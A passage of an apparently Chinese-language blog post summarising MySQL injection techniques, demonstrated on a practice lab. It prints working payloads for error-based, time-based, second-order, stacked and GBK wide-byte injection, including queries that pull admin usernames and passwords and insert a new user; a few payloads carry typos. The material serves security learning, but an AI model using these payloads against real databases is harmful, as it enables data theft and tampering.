class="comment">--+</span></span><br><span class="line">	</span><br><span class="line"># 查看表</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br><span class="line">	</span><br><span class="line">#查看字段</span><br><span class="line">?id=1&quot;) <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,column_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>vqu8obn5z9 LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br><span class="line">	</span><br><span class="line">#查看内容</span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>) <span class="keyword">FROM</span> admin limit <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="2、通过-Extractvalue-报错"><a href="#2、通过-Extractvalue-报错" class="headerlink" title="2、通过 Extractvalue 报错"></a>2、通过 Extractvalue 报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line"># 第一种</span><br><span class="line"><span class="keyword">and</span> extractvalue (<span class="number">1</span>,concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> database() limit <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"># 第二种</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;数据库&#x27;</span>),<span class="number">0x7e</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="3、通过updatexml-报错"><a href="#3、通过updatexml-报错" class="headerlink" title="3、通过updatexml 报错"></a>3、通过updatexml 报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> database())),<span class="number">1</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="4、通过-Name-const-报错"><a href="#4、通过-Name-const-报错" class="headerlink" title="4、通过 Name_const 报错"></a>4、通过 Name_const 报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line"> # 语句</span><br><span class="line"> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (selectname_const(<span class="keyword">select</span> @<span class="variable">@version</span>,<span class="number">0</span>))a <span class="keyword">join</span> (<span class="keyword">select</span> name_const(@<span class="variable">@version</span>,<span class="number">0</span>))b)c) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="5、通过join报错"><a href="#5、通过join报错" class="headerlink" title="5、通过join报错"></a>5、通过join报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="6、通过exp报错"><a href="#6、通过exp报错" class="headerlink" title="6、通过exp报错"></a>6、通过exp报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">exp</span> (<span class="operator">~</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> database()) a))</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="7、通过-GeometryCollection-报错"><a href="#7、通过-GeometryCollection-报错" class="headerlink" title="7、通过 GeometryCollection()报错"></a>7、通过 GeometryCollection()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> GeometryCollection(()<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span> () )a)b );</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="8、通过polygon报错"><a href="#8、通过polygon报错" class="headerlink" title="8、通过polygon报错"></a>8、通过polygon报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> polygon (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span> ())a)b );</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="9、通过multipoint-报错"><a href="#9、通过multipoint-报错" class="headerlink" title="9、通过multipoint ()报错"></a>9、通过multipoint ()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> multipoint (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="10、通过multlinestring-报错"><a href="#10、通过multlinestring-报错" class="headerlink" title="10、通过multlinestring ()报错"></a>10、通过multlinestring ()报错</h4><pre><code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="11、通过multpolygon-报错"><a href="#11、通过multpolygon-报错" class="headerlink" title="11、通过multpolygon ()报错"></a>11、通过multpolygon ()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> multpolygon (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(selectuser () )a)b );</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h4 id="12、通过linestring-报错"><a href="#12、通过linestring-报错" class="headerlink" title="12、通过linestring ()报错"></a>12、通过linestring ()报错</h4><pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 语句</span><br><span class="line"><span class="keyword">and</span> linestring (()<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>() )a)b );</span><br></pre></td></tr></table></figure>
+</code></pre>
+<h3 id="五-、延时注入"><a href="#五-、延时注入" class="headerlink" title="(五)、延时注入"></a>(五)、延时注入</h3><p>延时注入的原理和盲注差不多。<br>    <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#语句</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1)) =116,1,sleep(10))--+</span></span><br><span class="line"><span class="string">and if(ascii(语句)) =116,正常的返回值,不正常返回值)</span></span><br><span class="line"><span class="string">如果数据库名的第一字母的ascii等于166则返回1，否则延时10秒</span></span><br><span class="line"><span class="string">and if(ascii(substr(database(),1,1)) =116,sleep(10),1)</span></span><br><span class="line"><span class="string">这样写的话就是如果ascii等于166，则页面延时10秒，否则返回1</span></span><br></pre></td></tr></table></figure></p>
+<center>
+<img src="./images/sql/17.png" widith="50%">
+</center>
+
+<h3 id="六-、二次注入"><a href="#六-、二次注入" class="headerlink" title="(六)、二次注入"></a>(六)、二次注入</h3><p>二次注入产生的原理：当我们第一次存储数据进数据库时，执行的sql语句会经过一层校验，把敏感的字符给转义了。但是当数据存储进数据库时。它把数据还原为转义前的数据。当某个地方要取出数据时，取出去的数据就是这些恶意的语句，这次就会产生二次注入。</p>
+<h4 id="1、靶场测试"><a href="#1、靶场测试" class="headerlink" title="1、靶场测试"></a>1、靶场测试</h4><p>这是当前数据库里存储的账号密码</p>
+<center>
+<img src="./images/sql/18.png" widith="50%">
+</center>
+
+<p>这时去注册一个账号，注册账号为：admin’– -</p>
+<center>
+<img src="./images/sql/19.png" widith="50%">
+</center>
+然后在去数据库查看存储的账号密码，可以看到输入的账号已经给存入数据库了，使用这个账号密码就可以登陆
+
+<center>
+<img src="./images/sql/20.png" widith="50%">
+</center>
+
+<p>下一步我们就去修改账号密码</p>
+<center>
+<img src="./images/sql/21.png" widith="50%">
+</center>
+
+<p>然后我们去查看数据库里的数据，这时发现账号:admin’ – 这个账号的密码没变，但是账号：admin的密码却从原来的admin变成了12345<br>原理是：密码修改页面，它仅对特殊字符进行了转义，判断输入两次密码是否一致，然后将用户键入，将数据插入至数据库。就是因为它相信了数据库存的数据是正常，直接把数据拿来用了。就会产生这种注入。</p>
+<center>
+<img src="./images/sql/22.png" widith="50%">
+</center>
+
+<h3 id="七-、堆叠注入"><a href="#七-、堆叠注入" class="headerlink" title="(七)、堆叠注入"></a>(七)、堆叠注入</h3><p>原理：就是将原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的sql语句了，这个时候我们使用增删查改毫无限制。<br>使用条件：<br>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，<br>利用mysqli_multi_query()函数就支持多条sql语句同时执行，<br>但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，<br>其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
+<h4 id="1、靶场练习"><a href="#1、靶场练习" class="headerlink" title="1、靶场练习"></a>1、靶场练习</h4><p>用分号结束前面的语句，在后面插入我们的语句，这里我们向user表里添加一条新的用户数据<br>    <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; insert into users(id,username,password) value (123,&#x27;</span>aka<span class="string">&#x27;,&#x27;</span>aka<span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure></p>
+<center>
+<img src="./images/sql/23.png" widith="50%">
+</center>
+可以看到已经添加成功
+<center>
+<img src="./images/sql/24.png" widith="50%">
+</center>
+
+<h3 id="八-、宽字节注入"><a href="#八-、宽字节注入" class="headerlink" title="(八)、宽字节注入"></a>(八)、宽字节注入</h3><p>原理：当对特殊字符使用反斜杠“\”来处理特殊字符时，而数据库编码又为GBK,这时可能存在宽字节注入</p>
+<h4 id="1、靶场练习-1"><a href="#1、靶场练习-1" class="headerlink" title="1、靶场练习"></a>1、靶场练习</h4><p>先添加一个单引号，发现边成了1&#39;了。</p>
+<center>
+<img src="./images/sql/25.png" widith="50%">
+</center>
+
+<p>这时候在单引号前加上%df，因为反斜杠的url编码为 %5c，而%df%5c在GBK编码里会变成一个中文字符。这时就会达到一个绕过的效果。</p>
+<center>
+<img src="./images/sql/26.png" widith="50%">
+</center>
+
+<p>查看当前的数据库，可以判断我们输入的语句是成功执行的</p>
+<center>
+<img src="./images/sql/27.png" widith="50%">
+</center>  
+<br>  
+<br>  
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemFuZS1zL2FydGljbGVzLzEyMzcxODIwLmh0bWw=">https://www.cnblogs.com/zane-s/articles/12371820.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MS9hcnRpY2xlL2RldGFpbHMvMTEyNzcxNzg4">https://blog.csdn.net/weixin_46706771/article/details/112771788<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy5iZWVzZnVuLmNvbS8yMDE3LzAzLzI4L015U1FMJUU2JUIzJUE4JUU1JTg1JUE1JUU3JUIzJUJCJUU1JTg4JTk3JUU0JUI5JThCJUU0JUJBJThDJUU2JUFDJUExJUU2JUIzJUE4JUU1JTg1JUE1LSVFNCVCOCU4OS8=">http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly96Z2FvLnRvcC9zcWwlRTYlQjMlQTglRTUlODUlQTUlRTQlQjklOEIlRTUlQTAlODYlRTUlOEYlQTAlRTYlQjMlQTglRTUlODUlQTUlRTUlQUQlQTYlRTQlQjklQTAv">https://zgao.top/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/<i class="fa fa-external-link-alt"></i></span></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Ljierui
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html" title="Mysql注入总结">http://example.com/MySQL注入总结.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1jbg=="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">1、SQL注入原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.</span> <span class="nav-text">2、注入的类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">3.</span> <span class="nav-text">3、常见的注入利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80-%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">(一)、判断注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C-%E3%80%81%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.</span> <span class="nav-text">(二)、联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E5%88%A9%E7%94%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">3.2.1.</span> <span class="nav-text">1、利用注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E6%9F%A5%E6%89%BE%E6%98%BE%E9%94%99%E4%BD%8D"><span class="nav-number">3.2.2.</span> <span class="nav-text">2、查找显错位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.2.3.</span> <span class="nav-text">3、查看当前数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E7%9A%84%E8%A1%A8"><span class="nav-number">3.2.4.</span> <span class="nav-text">4、查看当前数据库下的所有的表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">3.2.5.</span> <span class="nav-text">5、查看表中存在的字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81%E6%9F%A5%E7%9C%8B%E7%89%B9%E5%AE%9A%E5%AD%97%E6%AE%B5%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-number">3.2.6.</span> <span class="nav-text">6、查看特定字段中的数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89-%E3%80%81%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.3.</span> <span class="nav-text">(三)、盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E7%9B%B2%E6%B3%A8%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">3.3.1.</span> <span class="nav-text">1、盲注中常用的函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.3.2.</span> <span class="nav-text">2、判断当前数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E7%8C%9C%E6%B5%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">3.3.3.</span> <span class="nav-text">3、猜测数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E7%8C%9C%E6%B5%8B%E8%A1%A8"><span class="nav-number">3.3.4.</span> <span class="nav-text">4、猜测表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E7%8C%9C%E6%B5%8B%E5%88%97%E5%90%8D"><span class="nav-number">3.3.5.</span> <span class="nav-text">5、猜测列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81%E8%8E%B7%E5%8F%96%E5%88%97%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-number">3.3.6.</span> <span class="nav-text">6、获取列中的数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B-%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.</span> <span class="nav-text">(四)、报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E9%80%9A%E8%BF%87floor%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.1.</span> <span class="nav-text">1、通过floor报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E9%80%9A%E8%BF%87-Extractvalue-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.2.</span> <span class="nav-text">2、通过 Extractvalue 报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E9%80%9A%E8%BF%87updatexml-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.3.</span> <span class="nav-text">3、通过updatexml 报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E9%80%9A%E8%BF%87-Name-const-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.4.</span> <span class="nav-text">4、通过 Name_const 报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E9%80%9A%E8%BF%87join%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.5.</span> <span class="nav-text">5、通过join报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%E3%80%81%E9%80%9A%E8%BF%87exp%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.6.</span> <span class="nav-text">6、通过exp报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7%E3%80%81%E9%80%9A%E8%BF%87-GeometryCollection-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.7.</span> <span class="nav-text">7、通过 GeometryCollection()报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8%E3%80%81%E9%80%9A%E8%BF%87polygon%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.8.</span> <span class="nav-text">8、通过polygon报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9%E3%80%81%E9%80%9A%E8%BF%87multipoint-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.9.</span> <span class="nav-text">9、通过multipoint ()报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10%E3%80%81%E9%80%9A%E8%BF%87multlinestring-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.10.</span> <span class="nav-text">10、通过multlinestring ()报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11%E3%80%81%E9%80%9A%E8%BF%87multpolygon-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.11.</span> <span class="nav-text">11、通过multpolygon ()报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12%E3%80%81%E9%80%9A%E8%BF%87linestring-%E6%8A%A5%E9%94%99"><span class="nav-number">3.4.12.</span> <span class="nav-text">12、通过linestring ()报错</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94-%E3%80%81%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">3.5.</span> <span class="nav-text">(五)、延时注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD-%E3%80%81%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">3.6.</span> <span class="nav-text">(六)、二次注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95"><span class="nav-number">3.6.1.</span> <span class="nav-text">1、靶场测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%83-%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">3.7.</span> <span class="nav-text">(七)、堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0"><span class="nav-number">3.7.1.</span> <span class="nav-text">1、靶场练习</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AB-%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">3.8.</span> <span class="nav-text">(八)、宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-1"><span class="nav-number">3.8.1.</span> <span class="nav-text">1、靶场练习</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ljierui" src="/images/touxiang.png">
+  <p class="site-author-name" itemprop="name">Ljierui</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xqaWVydWk=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ljierui"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1jbg=="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljierui</span>
